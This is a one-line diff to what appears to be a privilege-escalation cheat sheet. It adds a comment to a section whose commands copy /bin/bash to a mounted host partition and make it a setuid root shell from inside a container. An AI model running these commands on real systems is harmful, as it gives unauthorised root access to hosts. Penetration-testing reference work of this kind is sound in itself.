@@ -893,6 +893,7 @@ env /bin/sh -p
 
 ### Copy SUID binaries to mounted partition
 ```bash
+# From container as root
 cp /bin/bash /home/<user>/bash
 chmod 4755 /home/<user>/bash
 chown root:root /home/<user>/bash
